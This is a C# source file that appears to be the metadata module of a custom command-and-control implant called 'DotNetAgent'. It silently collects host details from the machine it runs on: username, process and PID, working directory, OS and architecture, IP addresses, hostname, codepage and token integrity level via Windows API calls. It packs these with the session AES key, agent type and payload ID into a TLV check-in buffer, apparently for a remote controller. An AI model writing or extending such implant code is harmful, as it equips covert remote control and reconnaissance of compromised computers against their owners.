using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;

namespace DotNetAgent
{
    internal class Metadata
    {
        private static Guid _id;
        private static string _userName;
        private static string _procName;
        private static string _workingDir;
        private static UInt32 _procPid;
        private static byte _os = 1;
        private static byte _osMajor = 0xFF;
        private static byte _osMinor = 0xFF;
        private static byte _archOs = 0xFF;
        private static byte _archProc = 0xFF;
        private static string _ips;
        private static string _hostname;
        private static UInt32 _ansiCodepage = 0xFF;
        private static string _integrity;
        private static long? _payloadId;

        private const int TOKEN_QUERY = 0x0008;
        private const int TokenIntegrityLevel = 25;

        private const byte TLV_ID = 0x1;
        private const byte TLV_USERNAME = 0x2;
        private const byte TLV_PROC_NAME = 0x3;
        private const byte TLV_PROC_PID = 0x4;
        private const byte TLV_WORKING_DIR = 0x5;
        private const byte TLV_OS = 0x6;
        private const byte TLV_OS_MAJOR = 0x7;
        private const byte TLV_OS_MINOR = 0x8;
        private const byte TLV_IPS = 0x9;
        private const byte TLV_HOSTNAME = 0xA;
        private const byte TLV_ARCH_PROC = 0xB;
        private const byte TLV_ARCH_OS = 0xC;
        private const byte TLV_ANSI_CODEPAGE = 0xD;
        private const byte TLV_INTEGRITY = 0xE;
        private const byte TLV_AES_KEY = 0x10;
        private const byte TLV_ENCRYPTION_TYPE = 0x11;
        private const byte TLV_AGENT_TYPE = 0x40;
        private const byte TLV_AGENT_VERSION = 0x41;
        private const byte TLV_PAYLOAD_ID = 0x43;

        private const byte ENCRYPTION_TYPE_AES_GCM = 0x02;
        private const string AGENT_TYPE = "CUSTOM";
        private const uint AGENT_VERSION = 1;

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(IntPtr ProcessHandle, int DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool GetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetSidSubAuthority(IntPtr pSid, uint nSubAuthority);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetSidSubAuthorityCount(IntPtr pSid);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        private static extern uint GetACP();

        public static void Initialize()
        {
            _id = Guid.NewGuid();

            var proc = Process.GetCurrentProcess();
            _userName = Environment.UserName;
            _procName = proc.ProcessName;
            _workingDir = Environment.CurrentDirectory;
            _procPid = (UInt32)proc.Id;

            _osMajor = (byte)Environment.OSVersion.Version.Major;
            _osMinor = (byte)Environment.OSVersion.Version.Minor;
            _archOs = Environment.Is64BitOperatingSystem ? (byte)1 : (byte)0;
            _archProc = Environment.Is64BitProcess ? (byte)1 : (byte)0;

            _ips = CollectIPs();
            _hostname = Environment.MachineName;
            _ansiCodepage = GetACP();
            _integrity = GetIntegrityLevel();
        }

        public static void Update()
        {
            _workingDir = Environment.CurrentDirectory;
            _ips = CollectIPs();
            _hostname = Environment.MachineName;
        }

        public static void SetPayloadId(long? payloadId) => _payloadId = payloadId;

        public static byte[] GetBuffer()
        {
            TLV parent = new TLV(TLV_ID);

            parent.AddChild(new TLV(TLV_ID, _id.ToByteArray()));
            if (_userName != null)
                parent.AddChild(new TLV(TLV_USERNAME, Encoding.UTF8.GetBytes(_userName)));
            if (_procName != null)
                parent.AddChild(new TLV(TLV_PROC_NAME, Encoding.UTF8.GetBytes(_procName)));
            if (_procPid != 0)
                parent.AddChild(new TLV(TLV_PROC_PID, BitConverter.GetBytes(_procPid)));
            if (_workingDir != null)
                parent.AddChild(new TLV(TLV_WORKING_DIR, Encoding.UTF8.GetBytes(_workingDir)));
            if (_os != 0)
                parent.AddChild(new TLV(TLV_OS, new byte[] { _os }));
            if (_osMajor != 0xFF)
                parent.AddChild(new TLV(TLV_OS_MAJOR, new byte[] { _osMajor }));
            if (_osMinor != 0xFF)
                parent.AddChild(new TLV(TLV_OS_MINOR, new byte[] { _osMinor }));
            if (_ips != null)
                parent.AddChild(new TLV(TLV_IPS, Encoding.UTF8.GetBytes(_ips)));
            if (_hostname != null)
                parent.AddChild(new TLV(TLV_HOSTNAME, Encoding.UTF8.GetBytes(_hostname)));
            if (_archProc != 0xFF)
                parent.AddChild(new TLV(TLV_ARCH_PROC, new byte[] { _archProc }));
            if (_archOs != 0xFF)
                parent.AddChild(new TLV(TLV_ARCH_OS, new byte[] { _archOs }));
            if (_ansiCodepage != 0xFF)
                parent.AddChild(new TLV(TLV_ANSI_CODEPAGE, BitConverter.GetBytes(_ansiCodepage)));
            if (_integrity != null)
                parent.AddChild(new TLV(TLV_INTEGRITY, Encoding.UTF8.GetBytes(_integrity)));
            if (Encryption.GetAesKey() != null)
                parent.AddChild(new TLV(TLV_AES_KEY, Encryption.GetAesKey()));
            parent.AddChild(new TLV(TLV_ENCRYPTION_TYPE, new byte[] { ENCRYPTION_TYPE_AES_GCM }));
            parent.AddChild(new TLV(TLV_AGENT_TYPE, Encoding.UTF8.GetBytes(AGENT_TYPE)));
            parent.AddChild(new TLV(TLV_AGENT_VERSION, BitConverter.GetBytes(AGENT_VERSION)));
            if (_payloadId.HasValue)
                parent.AddChild(new TLV(TLV_PAYLOAD_ID, BitConverter.GetBytes(_payloadId.Value)));
            return parent.GetFullBuffer();
        }

        private static string CollectIPs()
        {
            var addresses = new List<string>();
            foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.NetworkInterfaceType == NetworkInterfaceType.Loopback)
                    continue;

                foreach (var addr in ni.GetIPProperties().UnicastAddresses)
                {
                    if (addr.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                        addresses.Add(addr.Address.ToString());
                }
            }
            return string.Join(";", addresses);
        }

        private static string GetIntegrityLevel()
        {
            IntPtr hToken = IntPtr.Zero;
            try
            {
                if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, out hToken))
                    return "Unknown";

                int cbSize;
                GetTokenInformation(hToken, TokenIntegrityLevel, IntPtr.Zero, 0, out cbSize);

                IntPtr pTIL = Marshal.AllocHGlobal(cbSize);
                try
                {
                    if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, cbSize, out cbSize))
                        return "Unknown";

                    IntPtr pSid = Marshal.ReadIntPtr(pTIL);

                    IntPtr pCount = GetSidSubAuthorityCount(pSid);
                    byte subAuthorityCount = Marshal.ReadByte(pCount);
                    IntPtr pRid = GetSidSubAuthority(pSid, (uint)(subAuthorityCount - 1));
                    int rid = Marshal.ReadInt32(pRid);

                    if (rid < 0x1000) return "Untrusted";
                    if (rid < 0x2000) return "Low";
                    if (rid < 0x3000) return "Medium";
                    if (rid < 0x4000) return "High";
                    return "System";
                }
                finally
                {
                    Marshal.FreeHGlobal(pTIL);
                }
            }
            catch (Exception ex)
            {
                Logger.Warning($"Failed to get integrity level: {ex.Message}");
                return "Unknown";
            }
            finally
            {
                if (hToken != IntPtr.Zero)
                    CloseHandle(hToken);
            }
        }
    }
}
